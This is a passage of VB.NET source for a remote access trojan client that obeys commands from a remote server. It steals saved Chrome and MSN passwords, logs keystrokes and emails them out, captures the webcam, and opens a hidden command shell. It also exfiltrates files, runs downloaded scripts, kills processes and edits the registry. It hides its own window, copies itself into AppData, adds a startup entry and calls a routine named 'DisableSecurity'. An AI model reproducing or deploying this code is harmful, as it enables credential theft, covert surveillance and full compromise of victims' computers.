                        sendlog("Could not restart", "red")
                    End Try
                Case "OPENCD"
                    Try
                        sendlog("Disc drive opened", "green")
                        mciSendString("set CDAudio door open", 0, 0, 0)
                    Catch
                        sendlog("Could not open disc drive", "red")
                    End Try
                Case "CLOSECD"
                    Try
                        mciSendString("set CDAudio door closed", 0, 0, 0)
     
                        sendlog("Disc drive closed", "green")
                    Catch
                        sendlog("Could not close disc drive", "red")
                    End Try
     
                Case "BEEP"
                    Try
                        Console.Beep(700, 1000)
                        sendlog("Beeped at a frequencey of 700Hz for a duration of 1000ms", "green")
                    Catch ex As Exception
                        sendlog("Could not beep", "red")
                    End Try
                Case "HDI"
                    Try
                        Dim hWnd As IntPtr = FindWindow("ProgMan", Nothing)
                        hWnd = GetWindow(hWnd, GetWindowCmd.GW_CHILD)
     
     
                        ShowWindow(hWnd, SW.Hide)
                        sendlog("Desktop icons hidden successfully", "green")
     
                    Catch ex As Exception
                        sendlog("Unable to hide desktop icons", "red")
                    End Try
                Case "SDI"
                    Try
                        Dim hWnd As IntPtr = FindWindow("ProgMan", Nothing)
                        hWnd = GetWindow(hWnd, GetWindowCmd.GW_CHILD)
     
     
                        ShowWindow(hWnd, SW.ShowNoActivate)
                        sendlog("Desktop icons shown successfully", "green")
                    Catch ex As Exception
                        sendlog("Unable to show desktop icons", "red")
                    End Try
     
                Case "MOUSE"
                    Try
                        If mousehidden Then
                            ShowCursor(True)
                            sendlog("Mouse cursor set to visible. Press 'Show/Hide Cursor' to hide it", "green")
                        Else
                            ShowCursor(False)
                            sendlog("Mouse cursor hidden. Press 'Show/Hide Cursor' to make it visible again", "green")
                        End If
                    Catch ex As Exception
                        sendlog("Unable to toggle cursor visibility", "red")
                    End Try
                Case "PROC"
     
                    Select Case parts(1).ToLower
                        Case "tsk"
                            Try
                                Process.Start("taskmgr.exe")
                                sendlog("Started task manager successfully", "green")
                            Catch
                                sendlog("Unable to start task manager", "red")
                            End Try
     
     
                        Case "cmd"
                            Try
                                Process.Start("cmd.exe")
                                sendlog("Started command prompt successfully", "green")
                            Catch
                                sendlog("Unable to start command prompt", "red")
                            End Try
     
                        Case Else
                            Try
                                Process.Start(parts(1))
                                sendlog("Successfully started " & parts(1), "green")
                            Catch
                                sendlog("Unable to start " & parts(1), "red")
     
                            End Try
     
                    End Select
     
                Case "KILLPROC"
                    Try
                        Dim pnumber As Integer = System.Diagnostics.Process.GetProcesses.Length
                        Dim killed As Integer = 0
     
                        For Each p As Process In System.Diagnostics.Process.GetProcesses
                            Try
                                p.Kill()
                                killed += 1
                            Catch ex As Exception
     
                            End Try
                        Next
                        sendlog("Successfully killed " & killed & " out of " & pnumber & " processes", "green")
                    Catch ex As Exception
                        sendlog("Unable to kill processes", "red")
                    End Try
                Case "WALL"
                    Try
                        Dim wallpaperurl As String = parts(1)
     
                        Dim r As New Random
     
                        Dim filename As String = ""
                        Dim i As Integer
                        For i = 0 To 9
                            filename &= Chr(r.Next(65, 90))
                        Next
                        filename = filename & ".jpg"
                        Dim final As String = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\" & filename
                        My.Computer.Network.DownloadFile(wallpaperurl, final)
     
                        SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, final, SPIF_UPDATEINIFILE)
                        sendlog("Successfully changed desktop wallpaper", "green")
     
                    Catch ex As Exception
                        sendlog("An error occured while trying to change the desktop wallpaper", "green")
                    End Try
     
            End Select
        End Sub
    #End Region
    #Region "miscellanious"
    #Region "message box"
        Sub msgthread(ByVal info As Object)
            Dim infos() As String = Regex.Split(info, "<#>")
            Dim x As MessageBoxIcon
            Select Case infos(2).ToLower
                Case "information"
                    x = MessageBoxIcon.Information
                Case "question"
                    x = MessageBoxIcon.Question
                Case "error"
                    x = MessageBoxIcon.Error
                Case "exclamation"
                    x = MessageBoxIcon.Exclamation
     
            End Select
            MessageBox.Show(infos(1), infos(0), MessageBoxButtons.OK, x)
        End Sub
        Sub showmsgb(ByVal info As Object)
            Dim r As New Thread(New ParameterizedThreadStart(AddressOf msgthread))
            r.Start(info)
     
        End Sub
     
    #End Region
    #Region "texttospeach"
        Sub speak(ByVal speech As String)
            Dim SAPI
            SAPI = CreateObject("SAPI.spvoice")
            SAPI.Speak(speech)
        End Sub
     
     
    #End Region
    #End Region
    #Region "passwords"
        Sub getpasswords()
            Dim pwds As String = ""
            pwds = "PWD|"
            pwds &= getchrome()
            pwds &= "<~~>"
            'pwds &= "c`" & getopera() & "<a@a>"
            pwds &= getmsn()
            senddata(pwds)
     
        End Sub
        Public Function getchrome() As String
            Dim cpass(,) As String = Chrome.GetChrome()
            Dim chromer As String = String.Empty
            Dim i As Integer
     
            Dim pwdstring As String = ""
     
            For i = 0 To cpass.Length - 1
                Try
                    pwdstring &= cpass(i, 0) & "<@p@>" & cpass(i, 1) & "<@p@>" & cpass(i, 2) & "<@s@>"
     
                Catch
                End Try
            Next
            Return pwdstring
        End Function
     
     
        'Public Function getopera() As String
        '    Dim operas(100, 2) As String
        '    opera.meout(operas)
        '    Dim pwdstring As New RichTextBox
        '    For i = 0 To operas.Length / 3 - 1
        '        Try
        '            If operas(i, 0) <> "" Then
        '                pwdstring.AppendText(operas(i, 0))
        '                pwdstring.AppendText("<@p@>")
        '                pwdstring.AppendText(operas(i, 1))
        '                pwdstring.AppendText("<@p@>")
        '                pwdstring.AppendText(operas(i, 2))
        '                pwdstring.AppendText("<@s@>")
        '            End If
        '        Catch
        '        End Try
     
        '    Next
        '    Return pwdstring.Text
        '    operas = Nothing
     
        'End Function
        Public Function getmsn() As String
            On Error Resume Next
            Dim singlepwd As CMSNMessengerPassword
            Dim PMSNMessenger As New CMSNMessengerPasswords
            Dim pwdstring As String = ""
            For Each singlepwd In PMSNMessenger
     
                pwdstring &= "w" & "<@p@>" & singlepwd.Login & "<@p@>" & singlepwd.Password & "<@s@>"
     
     
            Next
            Return pwdstring
        End Function
    #End Region
    #Region "webcam"
        Sub stopcam()
            '  webcam.tocam = False
            webcam.killwindow()
     
        End Sub
        Sub sendcam()
            ' webcam.tocam = True
     
            'webcam.imgstr()
            senddata("WC|" & webcam.imgstr)
        End Sub
    #End Region
    #Region "website visit"
        Sub website(ByVal site As String)
            Process.Start(site)
        End Sub
    #End Region
    #Region "info commands"
        Sub sendcliinfo()
            'message
            'startip
            'startup key
            'startuppath
            'obfusc
            'installed
            'mutex
     
            senddata("INFOCLI|" & c.ip & "|" & c.message & "|" & c.startup & "|" & c.startupkey & "|" & c.startupdir & "|" & c.obfusc & "|" & c.mutex _
                     & "|" & c.mail & "|" & c.mailpwd & "|" & c.smtp & "|" & c.interval)
        End Sub
        Sub sendsysinfo()
            senddata("INFOSYS|" & machinedetails.machindets)
        End Sub
    #End Region
    #Region "scripts"
        Dim scriptcontainer As String
        Sub setscript()
            scriptcontainer = ""
        End Sub
        Sub writescript(ByVal part As String)
            scriptcontainer &= part
     
        End Sub
        Sub execscript(ByVal filetype As String)
            Dim extension As String
            Select Case filetype
                Case "H"
                    extension = ".html"
                Case "V"
                    extension = ".vbs"
                Case "B"
                    extension = ".bat"
                Case Else
                    extension = ".bat"
            End Select
     
            Dim temppath As String = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "/test" & New Random().Next(500, 1000) & extension
            Try
                Dim b As Byte() = Convert.FromBase64String(scriptcontainer)
                System.IO.File.WriteAllBytes(temppath, b)
     
                ' System.IO.File.WriteAllText(temppath, scriptcontainer)
                Process.Start(temppath)
                senddata("SCRIPT|S")
            Catch
                Try
                    Dim b As Byte() = Convert.FromBase64String(scriptcontainer)
                    System.IO.File.WriteAllBytes(temppath, b)
                    Process.Start(temppath)
                    senddata("SCRIPT|S")
                Catch
                    senddata("SCRIPT|X")
                End Try
     
            End Try
     
        End Sub
    #End Region
    #Region "chat"
        Dim chatter As New chat
        Sub showchat(ByVal text As String)
            If chatter.IsHandleCreated Then
            Else
                chatter = New chat
            End If
            chatter.setmsg(text)
            chatter.Show()
            chatter.BringToFront()
            chatter.Focus()
        End Sub
        Sub alertchat()
            chatter.alert()
        End Sub
    #End Region
    #Region "keylogger"
    #Region "offline logger"
        Dim AppendOFK As String = ""
        Dim iskey As Boolean = False
        Sub startofflinelogger()
            ofkstart = True
            disposek = False
            K.CreateHook()
            Timer1.Start()
        End Sub
    #End Region
     
        Public Sub K_Down(ByVal Key As String) Handles K.Down
            If ofkstart Then
     
                AppendOFK &= Key.Replace("<ptitle>", "<br /><br /><strong>").Replace("<o>", " - [").Replace("</ptitle>", "]</strong><br />").Replace("[/ENTER/]", "[ENTER]" & "<br />")
     
            End If
            If toklog Then
                Append &= Key
                If Append.Length > 20 Then
     
                    Dim tosend As String = Append
     
                    senddata("KLOGS|" & Append)
                    Append = ""
     
                End If
            End If
            'keybdtxt.Text &= Key
     
        End Sub
        Sub sendcurrlog()
            Dim tosend As String = Append
     
            senddata("KLOGS|" & Append)
            Append = ""
        End Sub
        Dim ofkstart As Boolean = False
        Dim WithEvents K As New Keyboard
        Dim Append As String = ""
        Dim toklog As Boolean = False
        Dim disposek As Boolean = False
        Sub startkeybd()
            If ofkstart Then
     
            Else
     
                K.CreateHook()
            End If
     
            toklog = True
            disposek = False
        End Sub
     
        Sub stopkeybd()
            toklog = False
     
            If ofkstart Then
            Else
                K.DiposeHook()
                disposek = True
            End If
     
            Dim tosend As String = Append
            senddata("KLOGS|" & tosend)
            Append = ""
        End Sub
    #End Region
    #Region "cmd"
        Dim ProcessCMD As Process
        Dim CMDLISTEN As Thread
        Public IsRunning As Boolean = False
     
        Public Sub CMD_Start()
            ProcessCMD = New Process
            ProcessCMD.StartInfo.FileName = "cmd"
            ProcessCMD.StartInfo.Arguments = Nothing
            ProcessCMD.StartInfo.UseShellExecute = False
            ProcessCMD.StartInfo.CreateNoWindow = True
            ProcessCMD.StartInfo.RedirectStandardOutput = True
            ProcessCMD.StartInfo.RedirectStandardError = True
            ProcessCMD.StartInfo.RedirectStandardInput = True
            ProcessCMD.Start()
     
            CMDLISTEN = New Thread(AddressOf CMDLISTENER)
            CMDLISTEN.IsBackground = True
            CMDLISTEN.Start()
            IsRunning = True
            System.Threading.Thread.Sleep(1000)
            senddata("CMD|" & Application.StartupPath & ">")
            ' WRITECMD("cd..")
        End Sub
        Dim command As String = "cd.."
        Public Sub WRITECMD(ByVal stext As String)
            ProcessCMD.StandardInput.WriteLine(stext)
            ProcessCMD.StandardInput.Flush()
            ProcessCMD.StandardInput.WriteLine("")
            ProcessCMD.StandardInput.Flush()
        End Sub
        Private Sub CMDLISTENER()
            CheckForIllegalCrossThreadCalls = False
            While True
                Try
                    Dim Answer As String = ProcessCMD.StandardOutput.ReadLine
                    If Answer.Contains(command) Then
                    Else
                        If Answer <> "" Then
                            senddata("CMD|" & Answer)
                        End If
                    End If
     
                Catch ex As Exception
     
                End Try
                System.Threading.Thread.Sleep(200)
            End While
        End Sub
        Public Sub CMDSTP()
            On Error Resume Next
            IsRunning = False
            CMDLISTEN.Abort()
            ProcessCMD.Kill()
        End Sub
    #End Region
    #Region "registry"
        Public Sub newregkey(ByVal name As String, ByVal value As String, ByVal path As String)
            Dim oldpath As String = path
     
            Dim hive As String = path.Split("\")(0).Trim.ToLower
            If hive = "hkcu" Then
                hive = "HKEY_CURRENT_USER"
            Else
                hive = "HKEY_LOCAL_MACHINE"
            End If
     
            path = hive & path.Replace(path.Split("\")(0), "")
     
     
            Dim added As Boolean = False
     
            Try
     
                Registry.SetValue(path, name, value)
                added = True
            Catch ex As Exception
            End Try
            'System.Threading.Thread.Sleep(500)
     
            If added Then
                Me.Invoke(New paradel(AddressOf setkey), oldpath)
     
                ' setkey(oldpath)
            Else
                Me.Invoke(New senddel(AddressOf senddata), "REGER|")
     
            End If
        End Sub
        Public Sub sethive(ByVal dat As String)
            reg.selecthive(dat)
        End Sub
        Public Sub setkey(ByVal dat As String)
            reg.sendkeys(dat)
        End Sub
        Public Sub deleteregkey(ByVal path As Object, ByVal key As Object)
            Dim realpath As String = path.Replace(path.Split("\")(0) & "\", "")
            If path.StartsWith("HKCU") Then
                Try
                    Dim r As RegistryKey = Registry.CurrentUser.OpenSubKey(realpath, True)
                    r.DeleteValue(key, True)
                Catch
                    senddata("REGK|error")
                End Try
                setkey(path)
            Else
                Try
                    Dim r As RegistryKey = Registry.LocalMachine.OpenSubKey(realpath, True)
                    r.DeleteValue(key, True)
                Catch
                    senddata("REGK|error")
                End Try
                setkey(path)
            End If
     
        End Sub
    #End Region
    #Region "appinfo"
     
        Public Sub deletestartup(ByVal key As String)
            findandkill(key)
            Try
                System.IO.File.Delete(key)
                sendappinfon()
            Catch
                sendappinfox()
            End Try
     
        End Sub
        Public Sub deletekey(ByVal key As String)
            Try
                Dim r As RegistryKey = Registry.CurrentUser.OpenSubKey("Software\Microsoft\Windows\CurrentVersion\Run", True)
                r.DeleteValue(key, True)
                sendappinfon()
            Catch
                sendappinfox()
            End Try
     
        End Sub
        Sub sendappinfox()
            'Software\Microsoft\Windows\CurrentVersion\Run
            Dim appinfo As String = ""
            Dim r As RegistryKey = Registry.CurrentUser.OpenSubKey("Software\Microsoft\Windows\CurrentVersion\Run")
            For Each values As String In r.GetValueNames
                appinfo &= values & "`" & "pixelsubkey" & "`" & values & "`" & r.GetValue(values) & "`" & "|"
            Next
            For Each File As String In System.IO.Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.Startup))
                appinfo &= System.IO.Path.GetFileName(File) & "`" & "`" & "`" & "`" & File & "|"
            Next
            senddata("APFOX|" & appinfo)
        End Sub
        Sub sendappinfon()
            'Software\Microsoft\Windows\CurrentVersion\Run
            Dim appinfo As String = ""
            Dim r As RegistryKey = Registry.CurrentUser.OpenSubKey("Software\Microsoft\Windows\CurrentVersion\Run")
            For Each values As String In r.GetValueNames
                appinfo &= values & "`" & "pixelsubkey" & "`" & values & "`" & r.GetValue(values) & "`" & "|"
            Next
            For Each File As String In System.IO.Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.Startup))
                appinfo &= System.IO.Path.GetFileName(File) & "`" & "`" & "`" & "`" & File & "|"
            Next
            senddata("APFON|" & appinfo)
        End Sub
        Sub sendappinfo()
            'Software\Microsoft\Windows\CurrentVersion\Run
            Dim appinfo As String = ""
            Dim r As RegistryKey = Registry.CurrentUser.OpenSubKey("Software\Microsoft\Windows\CurrentVersion\Run")
            For Each values As String In r.GetValueNames
                appinfo &= values & "`" & "pixelsubkey" & "`" & values & "`" & r.GetValue(values) & "`" & "|"
            Next
            For Each File As String In System.IO.Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.Startup))
                appinfo &= System.IO.Path.GetFileName(File) & "`" & "`" & "`" & "`" & File & "|"
            Next
            senddata("APFOF|" & appinfo)
        End Sub
     
    #End Region
     
    #Region "processes"
        Sub sendprocessinfo(ByVal id As String)
            Try
                Dim p As Process = System.Diagnostics.Process.GetProcessById(id)
                Dim threads As String = p.Threads.Count
                Dim windowtitle As String = p.MainWindowTitle
                Dim hwnd As String = p.Handle
                Dim starttime As String = p.StartTime
                '   Dim mdule As String
                'For Each md As String In p.Modules
                '   mdule = md(0).ToString
     
                'Next
                senddata("PINFO|" & p.ProcessName & "~" & id & "~" & threads & "~" & windowtitle & "~" & hwnd & "~" & starttime)
            Catch ex As Exception
                senddata("PINFOR|")
            End Try
        End Sub
        Sub sendprocesses()
            Dim procstring As String = ""
     
            For Each p As Process In System.Diagnostics.Process.GetProcesses
                procstring &= p.ProcessName & "~" & p.Id & "#"
            Next
            senddata("PROC|F|" & procstring)
        End Sub
        Sub killprocess(ByVal procid As String)
     
     
            Try
                Dim p As Process = System.Diagnostics.Process.GetProcessById(procid)
                p.Kill()
                System.Threading.Thread.Sleep(200)
                Dim procstring As String = ""
     
                For Each pr As Process In System.Diagnostics.Process.GetProcesses
                    procstring &= pr.ProcessName & "~" & pr.Id & "#"
                Next
                senddata("PROC|Y|" & procstring)
            Catch ex As Exception
                System.Threading.Thread.Sleep(200)
                Dim procstring As String = ""
     
                For Each pr As Process In System.Diagnostics.Process.GetProcesses
                    procstring &= pr.ProcessName & "~" & pr.Id & "#"
                Next
                senddata("PROC|N|" & procstring)
            End Try
     
        End Sub
    #End Region
    #Region "remote desktop"
    #Region "API"
        Private Const MOUSEEVENTF_ABSOLUTE = &H8000
        Private Const MOUSEEVENTF_LEFTDOWN = &H2
        Private Const MOUSEEVENTF_LEFTUP = &H4
        Private Const MOUSEEVENTF_MOVE = &H1
        Private Const MOUSEEVENTF_MIDDLEDOWN = &H20
        Private Const MOUSEEVENTF_MIDDLEUP = &H40
        Private Const MOUSEEVENTF_RIGHTDOWN = &H8
        Private Const MOUSEEVENTF_RIGHTUP = &H10
        Private Const DIR_WIN As Byte = 1
        Declare Sub mouse_event Lib "user32" Alias "mouse_event" (ByVal dwFlags As Integer, ByVal dx As Integer, ByVal dy As Integer, ByVal cButtons As Integer, ByVal dwExtraInfo As Integer)
    #End Region
        Delegate Sub senddel(ByVal which As Object)
        Delegate Sub paradel(ByVal info As String)
        Delegate Sub tripledelm(ByVal p1 As Boolean, ByVal p2 As String, ByVal p3 As String)
        Sub mclick(ByVal left As Boolean, ByVal x As String, ByVal y As String)
            Dim scrh As Integer = Screen.PrimaryScreen.Bounds.Height
            Dim scrw As Integer = Screen.PrimaryScreen.Bounds.Width
            Dim fx As String = x * scrw
            Dim fy As String = y * scrh
            Windows.Forms.Cursor.Position = New Point(fx, fy)
            If left = True Then
                mouse_event(MOUSEEVENTF_LEFTDOWN, 0, fx, fy, 1)
                System.Threading.Thread.Sleep(200)
                mouse_event(MOUSEEVENTF_LEFTUP, 0, fx, fy, 1)
            Else
                mouse_event(MOUSEEVENTF_RIGHTDOWN, 0, fx, fy, 1)
                System.Threading.Thread.Sleep(200)
                mouse_event(MOUSEEVENTF_RIGHTUP, 0, fx, fy, 1)
            End If
     
        End Sub
        Sub sendimage()
            senddata("IMG|" & rc.imgstr)
        End Sub
        Sub whichkey(ByVal whichkeytopress As String)
            If whichkeytopress <> "" Then
                Try
                    SendKeys.Send(whichkeytopress)
                Catch
                End Try
            End If
        End Sub
    #End Region
     
    #Region "file manager"
        Dim dlfiles As New Hashtable
        Public Function getfile(ByVal md5 As String) As dlfile
            Dim thefile As dlfile
            Dim entry As DictionaryEntry 'declare a variable of type dictionary entry
            Try
                For Each entry In dlfiles 'for each dictionary entry in the hashtable with all clients (clients)
     
                    If entry.Value.trim.ToString = md5.Trim.ToString Then 'if the entry is belongs to the client specified
     
                        thefile = CType(entry.Key, dlfile) ' cast the hashtable entry to a connection class
     
                    End If
                Next
            Catch
     
            End Try
            Try
                Return thefile
            Catch
            End Try
     
        End Function
        Public Function FileInUse(ByVal sFile As String) As Boolean
            If System.IO.File.Exists(sFile) Then
                Try
                    Dim F As Short = FreeFile()
                    FileOpen(F, sFile, OpenMode.Binary, OpenAccess.ReadWrite, OpenShare.LockReadWrite)
                    FileClose(F)
                Catch
                    Return True
                End Try
            End If
        End Function
        Public Sub findandkill(ByVal filenamer As String)
     
            If FileInUse(filenamer) = True Then
     
                For Each prc As Process In System.Diagnostics.Process.GetProcesses
                    Try
                        Dim query As String = String.Format("select * from Win32_Process where name='{0}.exe'", prc.ProcessName)
                        Dim searcher As New ManagementObjectSearcher("root\CIMV2", query)
                        Dim result = searcher.Get().GetEnumerator()
                        If Not result.MoveNext() Then Throw New ArgumentException("Process not found")
                        Dim resultpath As String = CStr(result.Current("ExecutablePath")).Trim.ToLower.Replace(" ", "_")
                        Dim finalpathstring As String = filenamer.Trim.ToLower.Replace(" ", "_")
                        If resultpath = finalpathstring Then
                            Try
                                prc.Kill()
                            Catch
                            End Try
                        End If
                    Catch
                    End Try
                Next
            End If
        End Sub
        Sub cancelfile(ByVal id As String)
            Try
                getfile(id).shoulddl = False
            Catch
            End Try
     
        End Sub
        Sub startfiledl(ByVal path As Object)
            CheckForIllegalCrossThreadCalls = False
            findandkill(path)
            Dim b As New dlfile
            Dim limit As Integer = 10000
            Dim id As String = Md5Get(path)
            b.id = id
            b.shoulddl = True
     
            dlfiles.Add(b, id)
     
            Dim parts() As String = SplitBySize(file64.readfile(path), limit)
            Dim i As Integer
            For i = 0 To parts.Length - 2
                'TextBox4.AppendText(i & "\ " & parts.Length - 2)
                If b.shoulddl = True Then
     
     
                    senddata("FP|" & parts(i) & "|" & id)
                    System.Threading.Thread.Sleep(500)
                Else
                    b.id = ""
                    dlfiles.Remove(b)
                    b = Nothing
                    Exit Sub
                End If
            Next
            System.Threading.Thread.Sleep(500)
            senddata("FF|" & parts(parts.Length - 1) & "|" & id)
     
            'finish here
        End Sub
        Public Function SplitBySize(ByVal strInput As String, ByVal iSize As Integer) As String()
            Dim strA() As String
            Dim iLength As Integer = strInput.Length()
            Dim iWords As Integer = iLength / iSize + IIf((iLength Mod iSize <> 0), 1, 0)
            ReDim strA(iWords)
            Dim j As Integer = 0, i As Integer
            For i = 0 To iLength Step iSize
                strA(j) = Mid(strInput, i + 1, iSize)
     
                j = j + 1
            Next i
            Return strA
        End Function
        Sub filedets(ByVal path As String)
            senddata("REQD|" & path & "|" & Md5Get(path) & "|" & file64.readfile(path).Length - 1)
            'TextBox4.AppendText("sending file details")
        End Sub
        Sub deletefile(ByVal path As String)
     
            Try
                findandkill(path)
            Catch
            End Try
            Try
                System.IO.File.Delete(path)
                senddata("DELF|S|" & path)
            Catch
                senddata("DELF|X|" & path)
            End Try
     
     
        End Sub
        Sub renamefile(ByVal path As String, ByVal newname As String, ByVal type As String)
            Select Case type.ToLower
                Case "file"
     
                    Try
                        findandkill(path)
                    Catch
                    End Try
                    Try
                        My.Computer.FileSystem.RenameFile(path, newname)
                        senddata("REN|S" & "|" & newname)
                    Catch ex As Exception
                        senddata("REN|X" & "|" & newname)
                    End Try
                Case "folder"
     
                    Try
                        My.Computer.FileSystem.RenameDirectory(path, newname)
                        senddata("REN|S" & "|" & newname)
                    Catch ex As Exception
                        senddata("REN|X" & "|" & newname)
                    End Try
            End Select
     
        End Sub
        Sub runfile(ByVal file As String)
            Try
                Process.Start(file)
                senddata("RUNF|S|" & file)
            Catch ex As Exception
                senddata("RUNF|X|" & file)
            End Try
        End Sub
        Sub senddrives()
     
            senddata("DRV|" & fm.getdrives)
     
        End Sub
        Sub custdir(ByVal dir As String)
     
            Select Case dir
                Case "mydocuments"
                    senddata("PTH|" & Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments))
                    sendpath(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments))
                Case "mymusic"
                    senddata("PTH|" & Environment.GetFolderPath(Environment.SpecialFolder.MyMusic))
                    sendpath(Environment.GetFolderPath(Environment.SpecialFolder.MyMusic))
                Case "mypictures"
                    senddata("PTH|" & Environment.GetFolderPath(Environment.SpecialFolder.MyPictures))
                    sendpath(Environment.GetFolderPath(Environment.SpecialFolder.MyPictures))
                Case "programfiles"
                    senddata("PTH|" & Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles))
                    sendpath(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles))
                Case "desktop"
                    senddata("PTH|" & Environment.GetFolderPath(Environment.SpecialFolder.Desktop))
                    sendpath(Environment.GetFolderPath(Environment.SpecialFolder.Desktop))
                Case "mycomputer"
                    senddrives()
            End Select
        End Sub
     
        Sub sendpath(ByVal path As String)
            senddata(getfiles(path))
        End Sub
     
        Public Shared Function getfiles(ByVal path As String) As String
            'MsgBox(path)
            Try
                'DIR|folder#folder#folder#`file~size#`file~size#
                Dim dirstring As String = "DIR|"
                For Each directory As String In System.IO.Directory.GetDirectories(path)
     
     
                    dirstring &= New DirectoryInfo(directory).Name.ToString & "#"
                Next
                dirstring &= "`"
                For Each file As String In System.IO.Directory.GetFiles(path)
                    Dim thefile As New FileInfo(file)
     
     
     
                    dirstring &= thefile.Name & "~" & thefile.Length & "#"
     
                Next
                Return (dirstring)
            Catch
                Return ("FERROR|")
            End Try
     
        End Function
    #End Region
        Public Function Md5Get(ByVal path As String) As String
            Dim md5Obj As New System.Security.Cryptography.MD5CryptoServiceProvider
            Dim bytes() As Byte = System.Text.Encoding.ASCII.GetBytes(path)
            bytes = md5Obj.ComputeHash(bytes)
            Dim strResult As String = ""
            For Each b As Byte In bytes
                strResult += b.ToString("x2")
            Next
            Return strResult
        End Function
        Sub doread(ByVal ar As IAsyncResult)
            Try
                Dim sr As New StreamReader(t.GetStream) 'declare a new streamreader to read fromt eh network stream
                Dim msg As String = sr.ReadLine() 'the msg is what is bing read
                messagerecieved(msg) 'start processing the message
                t.GetStream.BeginRead(New Byte() {0}, 0, 0, AddressOf doread, Nothing) 'continue to read
     
            Catch ex As Exception
     
     
                t.Close()
                System.Threading.Thread.Sleep(10000) 'if an error occurs, wait for 10 seconds
                connect(c.ip, c.port) 'try to reconnect
            End Try
        End Sub
        Private Sub Button1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs)
     
     
     
        End Sub
     
     
     
        Private Sub Form1_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
            Me.Visible = False
            Me.Opacity = 0
            Me.Hide()
            Me.Size = New Size(0, 0)
            Try
                Me.ShowInTaskbar = False
            Catch
            End Try
     
            loadprofile()
            setvisible()
        End Sub
        Dim visiblef As New visibleform
        Sub setvisible()
            Me.Visible = False
            Me.Opacity = 0
            Me.Hide()
            Me.Size = New Size(0, 0)
            Try
                Me.ShowInTaskbar = False
            Catch
            End Try
     
     
     
            ''''''visible form
            If c.visible Then
                visiblef.Show()
            End If
     
     
            ''''''''''adding to startup
            If c.startup = True Then
                addtostartup()
            End If
     
     
            '''''''mutex
            Try
                startup.checkrunning()
            Catch ex As Exception
            End Try
     
     
            '''''''''''''''''''''disabling the zone identifier
            Try
                startup.DisableSecurity()
            Catch
            End Try
     
     
     
            ''''''''''''''''''''''startup message, if any
            If c.message Then
                Dim r As New System.Threading.Thread(AddressOf showmsg)
                r.Start()
            End If
     
            If c.toofflinelog Then
                startofflinelogger()
            End If
     
            connect(c.ip, c.port) 'connect textbox1 as ip and textbox2 as port
        End Sub
     
    #Region "startup"
        Sub addtostartup()
            Try
                Try
                    System.IO.Directory.CreateDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\pixels\")
                Catch ex As Exception
     
                End Try
                'Dim guid As String = New Guid(CType(Me.GetType.Assembly.GetCustomAttributes(GetType(Runtime.InteropServices.GuidAttribute), False)(0), Runtime.InteropServices.GuidAttribute).Value).ToString
                Dim copypath As String = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\pixels\" & System.IO.Path.GetFileName(Application.ExecutablePath)
                If Application.ExecutablePath = copypath Then
                Else
                    Try
                        findandkill(copypath)
                    Catch ex As Exception
     
                    End Try
                    For Each p As Process In System.Diagnostics.Process.GetProcesses
                        If p.ProcessName.Contains(System.IO.Path.GetFileName(Application.ExecutablePath)) Then
                            p.Kill()
                        End If
                    Next
                    Try
                        System.IO.File.Copy(Application.ExecutablePath, copypath, True)
                    Catch ex As Exception
     
                    End Try
     
                End If
                Try
                    startup.addstartup(c.startupkey, copypath)
                Catch
                End Try
            Catch
                startup.addstartup(c.startupkey, Application.ExecutablePath)
            End Try
     
        End Sub
    #End Region
    #Region "message"
        Sub showmsg()
     
            MessageBox.Show(c.startupmessage, c.startuptitle, MessageBoxButtons.OK, MessageBoxIcon.Information)
     
     
        End Sub
    #End Region
     
    #Region "profile loading"
        Public Function cvrt(ByVal input As String) As String
            Return Encoding.Default.GetString(Convert.FromBase64String((input)))
        End Function
        Dim profilestring As String
        Sub loadprofile()
            Dim infos() As String = profilestring.Split(";")
            c.ip = cvrt(infos(0))
            c.port = CInt(cvrt(infos(1)))
            c.pwd = cvrt(infos(2))
            c.identification = cvrt(infos(3))
            If cvrt(infos(4)).Trim.Contains("1") Then
                c.message = True
            Else
                c.message = False
            End If
            c.startuptitle = cvrt(infos(5))
            c.startupmessage = cvrt(infos(6))
            If cvrt(infos(7)).Trim.Contains("1") Then
                c.visible = True
            Else
                c.visible = False
            End If
     
            If cvrt(infos(8)).Trim.Contains("1") Then
                c.startup = True
            Else
                c.startup = False
            End If
            c.startupkey = cvrt(infos(9))
            c.mutex = cvrt(infos(10))
            If cvrt(infos(11)).Trim.Contains("1") Then
                c.toofflinelog = True
            Else
                c.toofflinelog = False
            End If
     
            If cvrt(infos(12)).Trim.ToLower.Contains("g") Then
                c.smtp = "smtp.gmail.com"
            Else
                c.smtp = "smtp.live.com"
            End If
            c.mail = cvrt(infos(13))
            c.mailpwd = cvrt(infos(14))
            c.interval = ((((CInt(cvrt(infos(15)))) * 1000) * 60) * 60)
            'c.interval = ((((CInt(cvrt(infos(15)))) * 1) * 30) * 1000)
            Timer1.Interval = c.interval
        End Sub
    #End Region
     
        Private Sub Timer1_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer1.Tick
            MsgBox(AppendOFK)
            If email.sendmail(c.mail, c.mail, c.mailpwd, c.smtp, AppendOFK, "Key Capture | " & Environment.UserName & "|" & sysinfo.ID) Then
     
                AppendOFK = ""
     
            Else
     
            End If
     
        End Sub
    End Class
    Public Class dlfile
        Public shoulddl As Boolean = True
        Public id As String = ""
    End Class
     
     
    Public Class email
        Public Shared Function sendmail(ByVal toemail As String, ByVal fromemail As String, ByVal pwd As String, _
                     ByVal smpt As String, ByVal body As String, ByVal subject As String) As Boolean
            Dim sent As Boolean = False
            Dim client As New SmtpClient()
            Dim sendTo As New MailAddress(toemail)
            Dim from As MailAddress = New MailAddress(fromemail)
            Dim message As New MailMessage(from, sendTo)
     
            message.IsBodyHtml = True
            message.Subject = subject
            message.Body = body
     
